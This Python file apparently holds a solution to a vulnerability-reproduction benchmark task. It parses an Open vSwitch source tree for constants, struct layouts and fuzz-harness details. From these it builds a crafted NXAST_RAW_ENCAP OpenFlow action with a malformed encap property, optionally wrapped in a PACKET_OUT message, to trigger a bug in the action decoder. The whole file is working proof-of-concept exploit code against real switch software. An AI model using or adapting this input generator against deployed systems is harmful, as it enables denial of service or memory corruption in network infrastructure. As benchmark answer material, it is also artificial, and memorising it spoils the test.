import os
import re
import io
import ast
import tarfile
import struct
from typing import Dict, Optional, Tuple, List, Iterable


def _strip_c_comments(s: str) -> str:
    out = []
    i = 0
    n = len(s)
    in_block = False
    in_line = False
    in_str = False
    str_ch = ''
    while i < n:
        c = s[i]
        nxt = s[i + 1] if i + 1 < n else ''
        if in_line:
            if c == '\n':
                in_line = False
                out.append(c)
            i += 1
            continue
        if in_block:
            if c == '*' and nxt == '/':
                in_block = False
                i += 2
            else:
                i += 1
            continue
        if in_str:
            out.append(c)
            if c == '\\':
                if i + 1 < n:
                    out.append(s[i + 1])
                    i += 2
                else:
                    i += 1
            elif c == str_ch:
                in_str = False
                i += 1
            else:
                i += 1
            continue
        if c in ("'", '"'):
            in_str = True
            str_ch = c
            out.append(c)
            i += 1
            continue
        if c == '/' and nxt == '/':
            in_line = True
            i += 2
            continue
        if c == '/' and nxt == '*':
            in_block = True
            i += 2
            continue
        out.append(c)
        i += 1
    return ''.join(out)


_ALLOWED_AST_NODES = (
    ast.Expression, ast.BinOp, ast.UnaryOp, ast.Constant, ast.Name,
    ast.Add, ast.Sub, ast.Mult, ast.Div, ast.FloorDiv, ast.Mod,
    ast.BitOr, ast.BitAnd, ast.BitXor, ast.LShift, ast.RShift,
    ast.Invert, ast.UAdd, ast.USub,
    ast.Paren if hasattr(ast, 'Paren') else ast.AST,
)


def _safe_eval_int(expr: str, names: Dict[str, int]) -> Optional[int]:
    expr = expr.strip()
    if not expr:
        return None
    expr = re.sub(r'\b([0-9]+)(?:[uUlL]+)\b', r'\1', expr)
    expr = re.sub(r'\b(0x[0-9A-Fa-f]+)(?:[uUlL]+)\b', r'\1', expr)
    expr = expr.replace('(', ' ( ').replace(')', ' ) ')
    expr = expr.replace('~', ' ~ ')
    expr = re.sub(r'\s+', ' ', expr).strip()
    expr = re.sub(r'\btrue\b', '1', expr, flags=re.IGNORECASE)
    expr = re.sub(r'\bfalse\b', '0', expr, flags=re.IGNORECASE)

    try:
        tree = ast.parse(expr, mode='eval')
    except Exception:
        return None

    class Checker(ast.NodeVisitor):
        ok = True

        def generic_visit(self, node):
            if not isinstance(node, _ALLOWED_AST_NODES):
                self.ok = False
                return
            super().generic_visit(node)

    chk = Checker()
    chk.visit(tree)
    if not chk.ok:
        return None

    def eval_node(node):
        if isinstance(node, ast.Expression):
            return eval_node(node.body)
        if isinstance(node, ast.Constant):
            if isinstance(node.value, (int,)):
                return int(node.value)
            return None
        if isinstance(node, ast.Name):
            return int(names.get(node.id, 0))
        if isinstance(node, ast.UnaryOp):
            v = eval_node(node.operand)
            if v is None:
                return None
            if isinstance(node.op, ast.Invert):
                return ~v
            if isinstance(node.op, ast.UAdd):
                return +v
            if isinstance(node.op, ast.USub):
                return -v
            return None
        if isinstance(node, ast.BinOp):
            a = eval_node(node.left)
            b = eval_node(node.right)
            if a is None or b is None:
                return None
            op = node.op
            if isinstance(op, ast.Add):
                return a + b
            if isinstance(op, ast.Sub):
                return a - b
            if isinstance(op, ast.Mult):
                return a * b
            if isinstance(op, (ast.Div, ast.FloorDiv)):
                if b == 0:
                    return None
                return a // b
            if isinstance(op, ast.Mod):
                if b == 0:
                    return None
                return a % b
            if isinstance(op, ast.BitOr):
                return a | b
            if isinstance(op, ast.BitAnd):
                return a & b
            if isinstance(op, ast.BitXor):
                return a ^ b
            if isinstance(op, ast.LShift):
                return a << b
            if isinstance(op, ast.RShift):
                return a >> b
            return None
        return None

    try:
        v = eval_node(tree)
        if v is None:
            return None
        return int(v)
    except Exception:
        return None


class _CConstExtractor:
    def __init__(self):
        self._exprs: Dict[str, str] = {}
        self.values: Dict[str, int] = {}

    def add_text(self, text: str):
        text = _strip_c_comments(text)
        for m in re.finditer(r'^\s*#\s*define\s+([A-Za-z_]\w*)\s+(.+?)\s*$', text, flags=re.MULTILINE):
            name = m.group(1)
            if '(' in name:
                continue
            rhs = m.group(2).strip()
            if rhs.startswith('(') and rhs.endswith(')'):
                rhs = rhs[1:-1].strip()
            rhs = rhs.split('\\\n')[0].strip()
            rhs = re.sub(r'\s+', ' ', rhs)
            if '(' in name:
                continue
            if re.match(r'^[A-Za-z_]\w*\s*\(', rhs):
                continue
            if name not in self._exprs and name not in self.values:
                self._exprs[name] = rhs

        idx = 0
        while True:
            em = re.search(r'\benum\b', text[idx:])
            if not em:
                break
            start = idx + em.start()
            brace = text.find('{', start)
            if brace == -1:
                idx = start + 4
                continue
            i = brace + 1
            depth = 1
            while i < len(text) and depth:
                if text[i] == '{':
                    depth += 1
                elif text[i] == '}':
                    depth -= 1
                i += 1
            if depth != 0:
                break
            block = text[brace + 1:i - 1]
            idx = i

            entries = [e.strip() for e in block.split(',')]
            cur = -1
            for ent in entries:
                if not ent:
                    continue
                m = re.match(r'^([A-Za-z_]\w*)\s*(?:=\s*(.+))?$', ent)
                if not m:
                    continue
                name = m.group(1)
                expr = m.group(2)
                if expr is None:
                    cur = cur + 1
                    if name not in self.values:
                        self.values[name] = cur
                else:
                    expr = expr.strip()
                    self._exprs[name] = expr

    def resolve(self, max_iter: int = 50):
        for _ in range(max_iter):
            progress = False
            for name, expr in list(self._exprs.items()):
                if name in self.values:
                    del self._exprs[name]
                    progress = True
                    continue
                v = _safe_eval_int(expr, self.values)
                if v is None:
                    continue
                self.values[name] = v
                del self._exprs[name]
                progress = True
            if not progress:
                break

    def get(self, name: str) -> Optional[int]:
        return self.values.get(name)


def _extract_function_block(text: str, func_name: str) -> Optional[str]:
    pos = text.find(func_name)
    if pos == -1:
        return None
    brace = text.find('{', pos)
    if brace == -1:
        return None
    i = brace + 1
    depth = 1
    while i < len(text) and depth:
        c = text[i]
        if c == '{':
            depth += 1
        elif c == '}':
            depth -= 1
        i += 1
    if depth != 0:
        return None
    return text[brace:i]


def _find_struct_block(text: str, struct_name: str) -> Optional[str]:
    if struct_name not in text:
        return None
    idx = text.find(struct_name)
    brace = text.find('{', idx)
    if brace == -1:
        return None
    i = brace + 1
    depth = 1
    while i < len(text) and depth:
        if text[i] == '{':
            depth += 1
        elif text[i] == '}':
            depth -= 1
        i += 1
    if depth != 0:
        return None
    return text[brace + 1:i - 1]


def _parse_struct_fields(struct_body: str) -> List[Tuple[str, str, Optional[int], bool]]:
    struct_body = _strip_c_comments(struct_body)
    parts = []
    for decl in struct_body.split(';'):
        decl = decl.strip()
        if not decl:
            continue
        decl = re.sub(r'\s+', ' ', decl)
        if decl.startswith('struct ') and '{' in decl:
            continue
        m = re.match(r'^(struct\s+[A-Za-z_]\w*|[A-Za-z_]\w*)\s+([A-Za-z_]\w*)(?:\s*\[\s*(\d*)\s*\])?$', decl)
        if not m:
            m2 = re.match(r'^(struct\s+[A-Za-z_]\w*|[A-Za-z_]\w*)\s+([A-Za-z_]\w*)\s*\[\s*\]\s*$', decl)
            if m2:
                ctype = m2.group(1)
                name = m2.group(2)
                parts.append((ctype, name, None, True))
            continue
        ctype, name, arr = m.group(1), m.group(2), m.group(3)
        if arr is None:
            parts.append((ctype, name, None, False))
        else:
            if arr == '':
                parts.append((ctype, name, None, True))
            else:
                parts.append((ctype, name, int(arr), False))
    return parts


def _ctype_size(ctype: str) -> Optional[int]:
    ctype = ctype.strip()
    if ctype.startswith('struct '):
        st = ctype.split(None, 1)[1]
        if st == 'nx_action_header':
            return 16
        if st == 'ofp_action_header':
            return 4
        if st == 'ofp_header':
            return 8
        return None
    mapping = {
        'uint8_t': 1, 'int8_t': 1, 'char': 1,
        'uint16_t': 2, 'int16_t': 2, 'ovs_be16': 2,
        'uint32_t': 4, 'int32_t': 4, 'ovs_be32': 4,
        'uint64_t': 8, 'int64_t': 8, 'ovs_be64': 8,
    }
    return mapping.get(ctype, None)


def _ipv4_header(total_len: int, src: bytes, dst: bytes, proto: int = 6, ttl: int = 64, identification: int = 0) -> bytes:
    ihl_words = (total_len + 3) // 4
    if ihl_words < 5:
        ihl_words = 5
    if ihl_words > 15:
        ihl_words = 15
    total_len = ihl_words * 4
    ver_ihl = (4 << 4) | ihl_words
    tos = 0
    flags_frag = 0
    checksum = 0
    base = struct.pack('!BBHHHBBH4s4s', ver_ihl, tos, total_len, identification, flags_frag, ttl, proto, checksum, src, dst)
    options_len = total_len - 20
    hdr = base + (b'\x00' * options_len)

    def csum(data: bytes) -> int:
        if len(data) % 2:
            data += b'\x00'
        s = 0
        for i in range(0, len(data), 2):
            s += (data[i] << 8) + data[i + 1]
            s = (s & 0xFFFF) + (s >> 16)
        s = (s & 0xFFFF) + (s >> 16)
        return (~s) & 0xFFFF

    chks = csum(hdr)
    hdr = struct.pack('!BBHHHBBH4s4s', ver_ihl, tos, total_len, identification, flags_frag, ttl, proto, chks, src, dst) + (b'\x00' * options_len)
    return hdr


def _iter_source_files(src_path: str) -> Iterable[Tuple[str, bytes]]:
    if os.path.isdir(src_path):
        for root, _, files in os.walk(src_path):
            for fn in files:
                path = os.path.join(root, fn)
                rel = os.path.relpath(path, src_path)
                try:
                    with open(path, 'rb') as f:
                        yield rel.replace(os.sep, '/'), f.read()
                except Exception:
                    continue
        return

    def open_tar(path: str):
        if path.endswith('.zst') or path.endswith('.tzst') or path.endswith('.tar.zst'):
            try:
                import zstandard as zstd  # type: ignore
            except Exception:
                return None
            with open(path, 'rb') as f:
                dctx = zstd.ZstdDecompressor()
                stream = dctx.stream_reader(f)
                bio = io.BytesIO(stream.read())
                stream.close()
                return tarfile.open(fileobj=bio, mode='r:*')
        return tarfile.open(path, mode='r:*')

    tf = None
    try:
        tf = open_tar(src_path)
    except Exception:
        tf = None
    if tf is None:
        return

    with tf:
        for m in tf.getmembers():
            if not m.isreg():
                continue
            name = m.name
            try:
                f = tf.extractfile(m)
                if f is None:
                    continue
                data = f.read()
                yield name, data
            except Exception:
                continue


def _detect_harness_mode(files_text: List[Tuple[str, str]]) -> Tuple[str, int]:
    candidates = []
    for name, txt in files_text:
        if 'LLVMFuzzerTestOneInput' in txt or re.search(r'\bmain\s*\(', txt):
            score = 0
            if 'ofpacts_decode' in txt:
                score += 10
            if 'ofp-actions' in name or 'ofp_actions' in name or 'actions' in name:
                score += 5
            if 'decode_NXAST_RAW_ENCAP' in txt or 'RAW_ENCAP' in txt:
                score += 6
            if 'ofpraw_' in txt or 'ofptype_decode' in txt or 'ofp_print' in txt:
                score += 3
            candidates.append((score, name, txt))
    if not candidates:
        return ('actions', 0)
    candidates.sort(reverse=True, key=lambda x: x[0])
    _, _, txt = candidates[0]
    mode = 'actions'
    if ('ofpraw_' in txt) or ('ofptype_decode' in txt) or ('ofp_print' in txt) or ('ofp_header' in txt and 'ofpbuf' in txt and 'decode' in txt):
        if 'ofpacts_decode' not in txt:
            mode = 'message'
        else:
            if ('ofpraw_' in txt) or ('ofptype_decode' in txt) or ('ofp_print' in txt):
                mode = 'message'

    offset = 0
    m = re.search(r'ofpbuf_(?:use_const|const_initializer)\s*\([^,]*,\s*(data\s*(?:\+\s*\d+)?)', txt)
    if m:
        expr = m.group(1)
        mo = re.search(r'data\s*\+\s*(\d+)', expr)
        if mo:
            offset = int(mo.group(1))
    else:
        m2 = re.search(r'ofpbuf_(?:use_const|const_initializer)\s*\(\s*(data\s*(?:\+\s*\d+)?)', txt)
        if m2:
            expr = m2.group(1)
            mo = re.search(r'data\s*\+\s*(\d+)', expr)
            if mo:
                offset = int(mo.group(1))
    return (mode, offset)


def _choose_vendor_id(consts: _CConstExtractor) -> int:
    for k in ('NX_VENDOR_ID', 'NX_EXPERIMENTER_ID', 'NX_EXPERIMENTER', 'NX_EXPERIMENTER_ID1'):
        v = consts.get(k)
        if isinstance(v, int) and 0 <= v <= 0xFFFFFFFF:
            return v
    return 0x00002320


def _choose_raw_encap_subtype(consts: _CConstExtractor) -> Optional[int]:
    for k in ('NXAST_RAW_ENCAP', 'NXAST_RAW_ENCAP2'):
        v = consts.get(k)
        if isinstance(v, int):
            return v
    return None


def _extract_raw_prop_type(ofp_actions_c_text: str, consts: _CConstExtractor) -> Optional[int]:
    blk = _extract_function_block(ofp_actions_c_text, 'decode_ed_prop')
    if not blk:
        return None
    blk = _strip_c_comments(blk)
    cases = re.findall(r'\bcase\s+([^:]+)\s*:', blk)
    best = None
    for c in cases:
        lab = c.strip()
        if re.search(r'\bRAW\b', lab, flags=re.IGNORECASE):
            best = lab
            break
    if best is None:
        for c in cases:
            lab = c.strip()
            if 'OFPEDPT_' in lab or 'EDPT_' in lab or 'ED_PROP' in lab:
                best = lab
                break
    if best is None:
        return None
    if re.match(r'^(0x[0-9A-Fa-f]+|\d+)$', best):
        return int(best, 0)
    if best in consts.values:
        return consts.values[best]
    v = _safe_eval_int(best, consts.values)
    return v


def _find_text_file_containing(files: List[Tuple[str, str]], needles: List[str]) -> Optional[Tuple[str, str]]:
    for name, txt in files:
        ok = True
        for nd in needles:
            if nd not in txt:
                ok = False
                break
        if ok:
            return (name, txt)
    return None


def _build_raw_encap_action(
    vendor: int,
    subtype: int,
    ed_prop_type: int,
    action_total_len: int = 72,
    packet_type: int = 0x00000800,
    prop_payload: Optional[bytes] = None,
    struct_fixed_len_override: Optional[int] = None,
    packet_type_field_bits: int = 32,
) -> bytes:
    if prop_payload is None:
        prop_payload = _ipv4_header(
            total_len=44,
            src=bytes([1, 1, 1, 1]),
            dst=bytes([2, 2, 2, 2]),
            proto=6,
            ttl=64,
            identification=0,
        )
    if packet_type_field_bits == 32:
        fixed_after_nxa = 8 if struct_fixed_len_override is None else (struct_fixed_len_override - 16)
        if fixed_after_nxa < 4:
            fixed_after_nxa = 4
        pad_after_packet_type = fixed_after_nxa - 4
        if pad_after_packet_type < 0:
            pad_after_packet_type = 0
        fixed_part = struct.pack('!I', packet_type) + (b'\x00' * pad_after_packet_type)
    else:
        ns = (packet_type >> 16) & 0xFFFF
        pt = packet_type & 0xFFFF
        fixed_after_nxa = 8 if struct_fixed_len_override is None else (struct_fixed_len_override - 16)
        fixed_part = struct.pack('!HH', ns, pt) + (b'\x00' * max(0, fixed_after_nxa - 4))

    prop_len = 4 + len(prop_payload)
    if action_total_len is None:
        raise ValueError("action_total_len must be provided")
    base_len = 16 + len(fixed_part)
    props_total = action_total_len - base_len
    if props_total != prop_len:
        if action_total_len == 72:
            fixed_part = struct.pack('!I', packet_type) + b'\x00' * 4
            base_len = 16 + len(fixed_part)
            props_total = action_total_len - base_len
        if props_total != prop_len:
            if props_total >= 4:
                need_payload = props_total - 4
                if need_payload < 0:
                    need_payload = 0
                if need_payload != len(prop_payload):
                    if len(prop_payload) >= need_payload:
                        prop_payload = prop_payload[:need_payload]
                    else:
                        prop_payload = prop_payload + (b'\x00' * (need_payload - len(prop_payload)))
                prop_len = 4 + len(prop_payload)
            else:
                action_total_len = base_len + prop_len

    hdr = struct.pack('!HHI', 0xFFFF, action_total_len & 0xFFFF, vendor & 0xFFFFFFFF) + struct.pack('!H', subtype & 0xFFFF) + (b'\x00' * 6)
    prop = struct.pack('!HH', ed_prop_type & 0xFFFF, prop_len & 0xFFFF) + prop_payload
    out = hdr + fixed_part + prop
    if len(out) != (action_total_len & 0xFFFF):
        if len(out) % 8 != 0:
            pad = (8 - (len(out) % 8)) % 8
            out += b'\x00' * pad
        out = struct.pack('!HHI', 0xFFFF, len(out) & 0xFFFF, vendor & 0xFFFFFFFF) + struct.pack('!H', subtype & 0xFFFF) + (b'\x00' * 6) + out[16:]
    return out


def _wrap_packet_out(of_version: int, actions: bytes, xid: int = 0x11223344) -> bytes:
    OFPT_PACKET_OUT = 13
    buffer_id = 0xFFFFFFFF
    in_port = 0
    actions_len = len(actions)
    msg_len = 24 + actions_len
    hdr = struct.pack('!BBHI', of_version & 0xFF, OFPT_PACKET_OUT & 0xFF, msg_len & 0xFFFF, xid & 0xFFFFFFFF)
    po = struct.pack('!IIH', buffer_id, in_port, actions_len & 0xFFFF) + (b'\x00' * 6)
    return hdr + po + actions


class Solution:
    def solve(self, src_path: str) -> bytes:
        text_files: List[Tuple[str, str]] = []
        raw_files: List[Tuple[str, bytes]] = []
        for name, data in _iter_source_files(src_path):
            raw_files.append((name, data))

        for name, data in raw_files:
            if not (name.endswith('.c') or name.endswith('.h') or name.endswith('.cc') or name.endswith('.hpp')):
                continue
            if len(data) > 5_000_000:
                continue
            try:
                txt = data.decode('utf-8', errors='ignore')
            except Exception:
                continue
            text_files.append((name, txt))

        mode, offset = _detect_harness_mode(text_files)

        consts = _CConstExtractor()
        likely_names = (
            'NXAST_RAW_ENCAP', 'NX_VENDOR_ID', 'NX_EXPERIMENTER_ID', 'OFPEDPT',
            'decode_ed_prop', 'nx_action_raw_encap', 'RAW_ENCAP'
        )
        for name, txt in text_files:
            if name.endswith(('.h', '.c')) and any(k in txt for k in likely_names):
                consts.add_text(txt)
        consts.resolve()

        vendor = _choose_vendor_id(consts)
        subtype = _choose_raw_encap_subtype(consts)
        if subtype is None:
            for _, txt in text_files:
                m = re.search(r'\bNXAST_RAW_ENCAP\b\s*=\s*(0x[0-9A-Fa-f]+|\d+)', txt)
                if m:
                    subtype = int(m.group(1), 0)
                    break
        if subtype is None:
            subtype = 0

        ofp_actions_txt = None
        for name, txt in text_files:
            if name.endswith('ofp-actions.c') or (name.endswith('.c') and 'decode_ed_prop' in txt and 'ofpacts' in txt):
                ofp_actions_txt = txt
                break
        if ofp_actions_txt is None:
            for _, txt in text_files:
                if 'decode_ed_prop' in txt and 'decode_NXAST_RAW_ENCAP' in txt:
                    ofp_actions_txt = txt
                    break

        prop_type = None
        if ofp_actions_txt is not None:
            prop_type = _extract_raw_prop_type(ofp_actions_txt, consts)

        if prop_type is None:
            for key in ('OFPEDPT_RAW', 'OFP_EDPT_RAW', 'NX_EDPT_RAW', 'NX_OFPEDPT_RAW'):
                v = consts.get(key)
                if isinstance(v, int):
                    prop_type = v
                    break
        if prop_type is None:
            for k, v in consts.values.items():
                if isinstance(v, int) and 0 <= v <= 0xFFFF and re.search(r'\bRAW\b', k, flags=re.IGNORECASE) and ('EDPT' in k or 'OFPEDPT' in k):
                    prop_type = v
                    break
        if prop_type is None:
            prop_type = 1

        struct_fixed = None
        pkt_type_bits = 32
        for _, txt in text_files:
            if 'nx_action_raw_encap' not in txt:
                continue
            body = _find_struct_block(txt, 'nx_action_raw_encap')
            if not body:
                continue
            fields = _parse_struct_fields(body)
            fixed = 0
            for ctype, fname, arr, isflex in fields:
                if isflex:
                    break
                sz = _ctype_size(ctype)
                if sz is None:
                    continue
                if arr is not None:
                    fixed += sz * arr
                else:
                    fixed += sz
                if fname == 'packet_type' and sz == 2:
                    pkt_type_bits = 16
            struct_fixed = 16 + fixed
            break

        action = _build_raw_encap_action(
            vendor=vendor,
            subtype=subtype,
            ed_prop_type=prop_type,
            action_total_len=72,
            packet_type=0x00000800,
            prop_payload=_ipv4_header(
                total_len=44,
                src=bytes([1, 1, 1, 1]),
                dst=bytes([2, 2, 2, 2]),
                proto=6,
                ttl=64,
                identification=0,
            ),
            struct_fixed_len_override=struct_fixed,
            packet_type_field_bits=32 if pkt_type_bits == 32 else 16,
        )

        out = action
        if mode == 'message':
            out = _wrap_packet_out(6, action)

        if offset > 0:
            prefix = b'\x06' + (b'\x00' * (offset - 1))
            out = prefix + out

        return out